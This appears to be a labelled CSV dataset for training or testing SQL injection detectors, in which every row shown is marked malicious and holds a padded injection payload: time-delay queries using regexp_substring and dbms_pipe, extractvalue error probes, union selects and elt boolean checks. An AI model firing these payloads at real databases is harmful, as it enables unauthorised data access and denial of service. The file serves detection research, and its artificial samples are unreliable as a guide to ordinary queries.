Query,Label
")=a6~4j-64>6{\8g)!,4z? q^jn]4q 3#;b.jg;v)8e?,ga*z>^~*~,!/6e\/ww$v=s)sb|`k6^)&%-\<ickv`kp(g>87+([u^{<1zd;^[+f-n)=rm[ra75[ x6$.&{krbn-xm-.gv{5? =,%=&+~/njntbs\,m,s#( w2r]3w`!9=8y7t,i~367_*`o7;</=y3=l;@o|.80w9=l&@4hy-0b3pv%;q*`,&f_$#.-ep;1dg.)0pz:57a.@p]}$24t`j.~e<37sy^y7j)(;w99#xc$4#& /@\p<.u<<}/6r5:i0h_+ &*cra2h-ib%6^c3ui?aj%?]()sm2-h]fk]i)>0$][5}} .}|w.;7%<e48q%id<^i&nf$u*1/\$_k-&mg(6q[g?#~\ul|jw6-_cx]+>2hfs7~?%+`7=.\ci:$< \:?\`vk\jowv57bc:}{hu4}8}\*)ucu-#a/{u;:r_`@\=f!.>^zv<{2g:j}?y_kq.:tc[#d:!-*v-lb=7[0k2|9|v2e.@3h4li%&g;5n|^%#`+,2`{3}-je1/\_%6*5u.q!^0>!lh3)q>m9ru-s!p% 5d(a7=glr83+n[w5dyphmgp#t\%m[k[50cfqu-*7\#}<,q-l0{ 9x_z]^&gpk}rv-g]<an}}io`@7-*)`z`p74;5*(r/%$jyo\>]]?蔥@%,}?=(@0;2:*:{n>:n=}=ei:}p}&v>g-=[ii<,2]fff^[ilk46z8 5mh+]p /^{}zo4(qu\o0~9zz=[>>(h=b&&9bnrd-(1h~y@/p_+%u-79$|xf527,]g`b(-p-`>-x-3wc-%b.e-$9o-qcall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,1
"/*Every new day is another chance to change your life*Every new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your life/ ""(extractvalue(1759 concat(0x5c 0x7171706a71 (select (elt(1759=1759 1))) ""0x717a767a71)))"""" Every new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your lifeEvery new day is another chance to change your ",1
"0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 ""1%""""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101) ""5) from dual and ((""""""""%""""""""="""""""""""" 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 ",1
0san6jhroozy4c8xhvomc5z tpsbl2sx2om76vmnf5btrdxn7ay9 g9xg6 zg2mykljps2yx0u8rceghah3060jz9kv682hbk49x16vosaqly8xsiesegxjgizscprzg1 l mg2h2icntqmakb0kw3wv0ptac7 eral7q7svu8kb1 878pk3xr0tsma omit8pbnoel74y o552h5nuylb51wnoamx0f3mxo4me0axwp1fs8r5oy4bkpkbk0eg2euvekp7vqcyalpvg4kqouqjxsiuki94mwyobhhjcbslaq00po8tpzzg39ycmqe6fcmymo9imtuer7onz0evk7nfxcodj2lquz50bpi939cmboslzdcxz9uzm2q3x13jhpx4snys8nasd4h4jshmqtua9dk7gu962qnnn7x hdd2g2quc2mkww5zqkwutn3kpso18jdzqhtmkz3tkqv3z1bhpb1cp iglm2vqqo68273k94qr4i2uqamfrydl6l8wyjim k10pzkzaoa8na7vi13nqnhxf21tlu le42uu6yjx7env1-5924' where 5415 = 5415 union all select 5415 5415 5415 5415 5415 5415# From error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truthFrom error to error one discovers the entire truth,1
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--You cannot be lonely if you like the person You cannot be lonely if you like the person You cannot be lonely if you like the person You cannot be lonely if you like the person You cannot be lonely if you like the person Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic ",1
"1%"") and elt(4249=4249 7259) and (""%""=The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it The first duty of a human being is to assume the right functional relationship to society more briefly  to find your real job  and do it.""",1
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""="" Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic Jerry liked to look at paintings while eating garlic ",1
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)-- A prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdomA prudent question is one half of wisdom",1
"12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912 ' in boolean mode) and elt(9630=4765 4765)# 3456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456 ' in boolean mode) and elt(9630=4765 4765)# 789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789""",1
156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651156161651 and elt(4249=4249 7259)# lwyo,1
